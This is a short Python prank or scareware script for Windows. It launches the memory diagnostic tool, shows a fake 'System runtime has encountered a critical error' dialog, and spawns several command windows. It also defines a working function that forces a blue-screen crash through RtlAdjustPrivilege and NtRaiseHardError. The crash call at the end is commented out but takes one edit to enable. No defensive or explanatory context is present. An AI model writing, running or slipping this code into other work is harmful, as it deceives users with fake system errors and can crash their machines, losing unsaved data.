from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import ctypes
import os
import time
import subprocess
import random

def trigger_bsod():

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

subprocess.Popen("MdSched.exe", shell=True)
time.sleep(1)

ctypes.windll.user32.MessageBoxW(
    0,
    "System runtime (WinDLL) has encountered a critical error.",
    "Error 0xC000007B",
    0x10
)
time.sleep(1)

for i in range(5):
    time.sleep(random.uniform(0.2,0.7))
    subprocess.Popen("start cmd /c exit", shell=True)
#trigger_bsod()